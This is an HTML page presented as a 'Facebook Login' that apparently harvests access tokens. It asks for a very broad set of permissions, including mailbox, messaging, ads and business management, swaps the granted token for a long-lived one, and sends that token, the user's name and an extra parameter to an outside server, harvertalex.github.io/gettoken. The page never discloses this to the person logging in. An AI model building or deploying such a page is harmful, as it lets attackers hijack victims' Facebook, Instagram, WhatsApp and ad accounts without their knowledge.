<!DOCTYPE html>
<html>
<head>
  <title>Facebook Login</title>
  <meta charset="UTF-8">
  <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js"></script>
</head>
<body>
  <div id="fb-root"></div>
  <script>
    var urlParams = new URLSearchParams(window.location.search);
    var appId = urlParams.get('app_id');
    var clientSecret = urlParams.get('client_secret');
	var actNaming = urlParams.get('act_naming');

    function statusChangeCallback(response) {
      if (response.status === 'connected') {
        getLongLivedToken(response.authResponse.accessToken);
      }
    }

    function checkLoginState() {
      FB.getLoginStatus(function(response) {
        statusChangeCallback(response);
      });
    }

    window.fbAsyncInit = function() {
      FB.init({
        appId: appId,
        cookie: true,
        xfbml: true,
        version: 'v18.0'
      });
    };

    function getLongLivedToken(shortLivedToken) {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          var longLivedToken = JSON.parse(this.responseText).access_token;
          getUserName(longLivedToken);
        }
      };
      xhttp.open("GET", "https://graph.facebook.com/v18.0/oauth/access_token?grant_type=fb_exchange_token&client_id=" + appId + "&client_secret=" + clientSecret + "&fb_exchange_token=" + shortLivedToken, true);
      xhttp.send();
    }

    function getUserName(longLivedToken) {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          var userName = JSON.parse(this.responseText).name;
          sendDataToServer(longLivedToken, userName);
        }
      };
      xhttp.open("GET", "https://graph.facebook.com/v18.0/me?access_token=" + longLivedToken, true);
      xhttp.send();
    }

    function sendDataToServer(longLivedToken, userName) {
      var yourServerURL = "https://harvertalex.github.io/gettoken/"; // Replace with your server's URL
      var url = new URL(yourServerURL);
      url.searchParams.append("longLivedToken", longLivedToken);
      url.searchParams.append("userName", userName);
	  // Get the name
	  url.searchParams.append("actNaming", actNaming);

      fetch(url)
        .then(response => {
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }
          return response.text();
        })
        .then(data => {
          console.log('Success:', data);
        })
        .catch((error) => {
          console.error('Error:', error);
        });
    }

  </script>

  <!-- The JS SDK Login Button -->
  <fb:login-button scope="create_event, create_note, email, export_stream, manage_friendlists, manage_fundraisers, manage_notifications, photo_upload, publish_checkins, publish_stream, read_friendlists, read_custom_friendlists, read_insights, read_mailbox, read_requests, read_stream, rsvp_event, status_update, share_item, sms, video_upload, xmpp_login, offline_access, publish_video, openid, catalog_management, user_messenger_contact, gaming_user_locale, private_computation_access, instagram_graph_user_profile, instagram_graph_user_media, user_managed_groups, groups_show_list, pages_manage_cta, pages_manage_instant_articles, pages_show_list, pages_messaging, pages_messaging_phone_number, pages_messaging_subscriptions, read_page_mailboxes, ads_management, ads_read, business_management, instagram_basic, instagram_manage_comments, instagram_manage_insights, instagram_content_publish, publish_to_groups, groups_access_member_info, leads_retrieval, whatsapp_business_management, instagram_manage_messages, attribution_read, page_events, pages_read_engagement, pages_manage_metadata, pages_read_user_content, pages_manage_ads, pages_manage_posts, pages_manage_engagement, whatsapp_business_messaging, instagram_shopping_tag_products, read_audience_network_insights, instagram_manage_events" onlogin="checkLoginState();"></fb:login-button>

  <div id="status"></div>
</body>
</html>
